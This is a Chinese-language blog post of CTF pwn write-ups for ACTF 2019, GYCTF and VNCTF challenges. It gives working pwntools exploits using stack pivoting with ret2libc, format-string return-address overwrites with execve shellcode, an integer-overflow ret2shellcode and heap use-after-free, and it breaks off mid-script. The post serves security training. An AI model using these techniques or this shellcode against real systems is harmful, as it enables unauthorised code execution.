<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>近期进阶 Pwn 合集 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="近期进阶 Pwn 合集"><meta property="og:description" content="难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/recent-pwn-medium/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-03-01T14:10:54+00:00"><meta property="article:modified_time" content="2020-03-01T14:10:54+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="近期进阶 Pwn 合集"><meta name=twitter:description content="难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/recent-pwn-medium/><link rel=prev href=https://blog.sigmerc.top/hitcon-training/><link rel=next href=https://blog.sigmerc.top/stack-migration/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"近期进阶 Pwn 合集","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/recent-pwn-medium\/"},"genre":"posts","keywords":"整数溢出, 栈漏洞, fsb, 堆漏洞","wordcount":3670,"url":"https:\/\/blog.sigmerc.top\/recent-pwn-medium\/","datePublished":"2020-03-01T14:10:54+00:00","dateModified":"2020-03-01T14:10:54+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">近期进阶 Pwn 合集</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>二进制安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-03-01>2020-03-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3670 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;<span id=/recent-pwn-medium/ class=leancloud_visitors data-flag-title="近期进阶 Pwn 合集">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#actf-2019>ACTF 2019</a><ul><li><a href=#babystack>babystack</a></li><li><a href=#一个复读机>一个复读机</a></li><li><a href=#another_repeater>another_repeater</a></li><li><a href=#babyheap>babyheap</a></li><li><a href=#message>message</a></li></ul></li><li><a href=#gyctf-2020>GYCTF 2020</a><ul><li><a href=#borrowstack>borrowstack</a></li><li><a href=#some_thing_exceting>some_thing_exceting</a></li><li><a href=#some_thing_interesting>some_thing_interesting</a></li><li><a href=#signin>signin</a></li><li><a href=#force>force</a></li><li><a href=#bf_note>bf_note</a></li><li><a href=#document>document</a></li></ul></li><li><a href=#vnctf-2020>VNCTF 2020</a><ul><li><a href=#simpleheap>simpleHeap</a></li><li><a href=#easytheap>easyTHeap</a></li><li><a href=#warmup>warmup</a></li><li><a href=#babybabypwn_1>babybabypwn_1</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。</p><h2 id=actf-2019>ACTF 2019</h2><h3 id=babystack>babystack</h3><p>只能溢出 0x10 字节，因此使用栈迁移。这题的迁移比较简单，题目给了栈地址，并且只需要迁移一次。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>leave</span> <span class=o>=</span> <span class=mh>0x400a18</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400ad3</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0xe0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;saved at 0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ebp2,payload,padding,fake ebp,leave_ret</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=mh>0x4008f6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span><span class=n>leave</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;~</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>puts</span><span class=p>,</span><span class=s1>&#39;puts&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0xe0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;saved at 0x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span><span class=n>leave</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=一个复读机>一个复读机</h3><p>很容易发现格式化字符串漏洞，首先测出偏移为 7 处是返回地址，我们往这里写地址即可。写什么地址呢？程序没有开启 NX 保护，因此可以先布置 shellcode，然后写 shellcode 地址。</p><p>但是我们只能在栈上布置 shellcode，而栈地址以 <code>0xff</code> 开头，如果直接写入 4 字节地址，那么需要输出非常长的字符串才行，非常耗时。因此我们尝试分 2 次写入，每次 2 字节。</p><p>从 <a href=https://www.csuaurora.org/ACTF_2019/ target=_blank rel="noopener noreffer">这里</a> 盗取了一张不错的图示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>To illustrate why we write payload in that way
</span></span><span class=line><span class=cl>This is an example stack layout, supposing the leak address is 0xffffc970
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c930  |  0xffffc970   |  (addr of format string)
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c934  |  xxxxxxxxxx   |  1$ (first parameter of printf)
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>           .....
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c94c  |  return addr  |  7$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>           .....
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c970  |  0xffffc94c   | 16$ (start addr of read buffer)
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c974  |    &#34;%516&#34;     | 17$ (51628 = 0xc9b0 - 4)
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c978  |    &#34;28d%&#34;     | 18$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c97c  |    &#34;16$h&#34;     | 19$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c980  |    &#34;naaa&#34;     | 20$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c984  |  0xffffc94e   | 21$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c988  |    &#34;%138&#34;     | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3)
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c98c  |    &#34;69d%&#34;     | 23$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c990  |    &#34;21$h&#34;     | 24$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c994  |    &#34;naaa&#34;     | 25$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c998  |    &#34;aaaa&#34;     | 26$
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>           .....
</span></span><span class=line><span class=cl>      *---------------*
</span></span><span class=line><span class=cl>c9b0  |               |
</span></span><span class=line><span class=cl>      |   shellcode   |
</span></span><span class=line><span class=cl>      |               |
</span></span><span class=line><span class=cl>      *---------------*
</span></span></code></pre></td></tr></table></div></div><p>首先要写的目标是 <code>0xffffc94c</code> 也就是返回地址所在位置，向这个位置先写入 <code>0xc9b0</code> 也就是后面我们计算出的 shellcode 地址的低 4 位，这里 <code>-4</code> 是因为前面已经输出 <code>0xffffc94c</code> 这 4 字节了。因此第一步 payload 为 <code>%51628d%16$hnaaa</code>，最后 <code>aaa</code> 是为了凑到 4 字节对齐，<code>hn</code> 是以 2 字节写入，<code>16</code> 的偏移可以自动化测出。</p><p>同理，第二步要写入的目标是 <code>0xffffc94e</code>，写入数据是 shellcode 高 4 位减去低 4 位 <code>0xffff-0xc9b0</code>，随后 <code>-4</code> 是因为前面已经输出 <code>0xffffc94e</code> 这 4 字节，<code>-3</code> 是因为第一步填充的 <code>aaa</code> 占 3 字节。第二步 payload 即 <code>%13869d%21$hnaaa</code>。</p><p>两步的 payload 合并后长为 0x28 字节，在后面放上 shellcode，此时即确定了 shellcode 的地址。触发漏洞就能 getshell 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>buf</span><span class=o>+</span><span class=mh>0x28</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>buf</span><span class=o>-</span><span class=mh>0x24</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;%&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>((</span><span class=n>sc</span><span class=o>&amp;</span><span class=mh>0xffff</span><span class=p>)</span><span class=o>-</span><span class=mi>4</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;d%16$hnaaa&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>ret</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;%&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(((</span><span class=n>sc</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffff</span><span class=p>)</span><span class=o>-</span><span class=p>(</span><span class=n>sc</span><span class=o>&amp;</span><span class=mh>0xffff</span><span class=p>)</span><span class=o>-</span><span class=mi>7</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;d%21$hnaaa&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=another_repeater>another_repeater</h3><p>题目在输入长度时可以整数溢出，还给了 <code>buf</code> 的地址。那么直接输入 <code>-1</code>，然后 ret2shellcode 即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=se>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;peat?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x41b</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=babyheap>babyheap</h3><p>uaf 覆盖打印函数为 <code>system</code>，内容为 <code>/bin/sh</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;size: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;content: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;index: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x20</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x602010</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=n>binsh</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=message>message</h3><p>利用 double free 欺骗 malloc 分配一个位于 bss 段的 chunk，使得我们可以控制全局数组，从而修改 0 号堆块的内容。然后先泄露 libc 再劫持 <code>__free_hook</code> 到 <code>system</code> 即可。需要注意 fastbin 的大小检查。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
